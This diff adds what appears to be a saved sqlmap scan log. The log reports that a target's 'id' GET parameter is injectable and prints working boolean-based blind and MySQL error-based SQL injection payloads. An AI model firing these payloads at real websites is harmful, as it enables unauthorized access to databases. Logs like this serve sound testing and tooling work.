@@ -1,0 +1,24 @@
+[*] starting @ 10:30:15 /2025/
+
+[10:30:15] [INFO] testing connection to the target URL
+[10:30:15] [INFO] testing if the URL is stable
+[10:30:16] [INFO] target URL is stable
+[10:30:16] [INFO] testing if GET parameter 'id' is dynamic
+[10:30:16] [INFO] GET parameter 'id' appears to be dynamic
+[10:30:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[10:30:17] [INFO] testing for SQL injection on GET parameter 'id'
+[10:30:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:30:18] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[10:30:19] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[10:30:19] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1234=1234
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 1234 FROM(SELECT COUNT(*),CONCAT(0x7176787671,(SELECT (ELT(1234=1234,1))),0x716a767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+[10:30:20] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0
